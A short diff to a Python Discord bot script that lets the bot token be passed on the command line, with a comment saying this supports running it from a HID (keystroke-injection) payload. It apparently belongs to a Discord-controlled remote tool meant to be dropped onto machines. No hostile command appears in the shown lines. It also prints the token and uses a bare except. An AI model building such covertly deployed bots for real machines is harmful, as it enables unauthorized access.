@@ -7,13 +7,26 @@ import asyncio
 import platform
 import socket
 from requests import get
+import sys
 
 intents = discord.Intents.default()
 intents.message_content = True
 
-load_dotenv()
+# Check if it is being used in a HID payload
 
-token = os.getenv("DISCORD_TOKEN")
+try:
+    if sys.argv[1] == "1":
+        token = sys.argv[2]
+        print(token)
+    else:
+        load_dotenv()
+
+        token = os.getenv("DISCORD_TOKEN")
+except:
+    print("probably not executed with HID payload")
+    load_dotenv()
+
+    token = os.getenv("DISCORD_TOKEN")
 
 client = discord.Client(intents=intents)
 
